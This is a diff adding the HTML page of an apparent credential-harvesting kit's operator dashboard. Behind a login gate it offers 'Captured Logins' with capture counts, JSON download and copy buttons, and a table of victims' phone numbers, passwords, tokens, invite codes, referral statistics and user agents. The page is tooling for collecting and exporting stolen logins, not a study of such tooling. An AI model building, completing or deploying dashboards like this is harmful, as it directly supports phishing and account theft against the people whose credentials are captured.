@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin Panel</title>
+  <meta name="robots" content="noindex, nofollow">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <!-- ====== ADMIN LOGIN GATE ====== -->
+  <div class="admin-login-gate" id="adminLoginGate">
+    <div class="admin-login-card">
+      <h1>🔒 Admin Access</h1>
+      <p class="subtitle">Enter credentials to view captured data</p>
+
+      <div class="admin-field">
+        <label for="adminUsername">Username</label>
+        <input type="text" id="adminUsername" placeholder="Enter username" autocomplete="off">
+      </div>
+
+      <div class="admin-field">
+        <label for="adminPassword">Password</label>
+        <input type="password" id="adminPassword" placeholder="Enter password" autocomplete="off">
+      </div>
+
+      <button type="button" class="admin-login-btn" id="adminLoginBtn">Sign In</button>
+      <div class="admin-error" id="adminError"></div>
+    </div>
+  </div>
+
+  <!-- ====== ADMIN DASHBOARD ====== -->
+  <div class="admin-dashboard" id="adminDashboard">
+
+    <!-- Header -->
+    <div class="admin-header">
+      <h1>
+        Captured Logins
+        <span class="badge" id="totalBadge">0</span>
+      </h1>
+      <div class="admin-actions">
+        <button type="button" class="admin-btn primary" id="refreshBtn" title="Refresh data">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="23 4 23 10 17 10"/>
+            <polyline points="1 20 1 14 7 14"/>
+            <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"/>
+          </svg>
+          Refresh
+        </button>
+        <button type="button" class="admin-btn success" id="downloadBtn" title="Download as JSON">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+            <polyline points="7 10 12 15 17 10"/>
+            <line x1="12" y1="15" x2="12" y2="3"/>
+          </svg>
+          Download JSON
+        </button>
+        <button type="button" class="admin-btn primary" id="copyBtn" title="Copy as plain text">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+          </svg>
+          Copy Text
+        </button>
+        <button type="button" class="admin-btn danger" id="logoutBtn" title="Logout">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
+            <polyline points="16 17 21 12 16 7"/>
+            <line x1="21" y1="12" x2="9" y2="12"/>
+          </svg>
+          Logout
+        </button>
+      </div>
+    </div>
+
+    <!-- Stats -->
+    <div class="admin-stats">
+      <div class="stat-card">
+        <div class="stat-label">Total Captures</div>
+        <div class="stat-value" id="totalCount">0</div>
+      </div>
+      <div class="stat-card">
+        <div class="stat-label">Today</div>
+        <div class="stat-value" id="todayCount">0</div>
+      </div>
+    </div>
+
+    <!-- Data Table -->
+    <div class="admin-table-container">
+      <table class="admin-table">
+        <thead>
+          <tr>
+            <th>#</th>
+            <th>Phone Number</th>
+            <th>Password</th>
+            <th>Login</th>
+            <th>Token</th>
+            <th>Spread UID</th>
+            <th>Invite Code</th>
+            <th>Spread Count</th>
+            <th>Rebate Sum</th>
+            <th>Sub Users</th>
+            <th>Timestamp</th>
+            <th>User Agent</th>
+          </tr>
+        </thead>
+        <tbody id="dataTableBody">
+          <tr class="empty-row">
+            <td colspan="12">Login to view data</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+
+  </div>
+
+  <!-- NO Supabase CDN — all logic goes through server API -->
+  <script src="js/admin.js"></script>
+</body>
+</html>
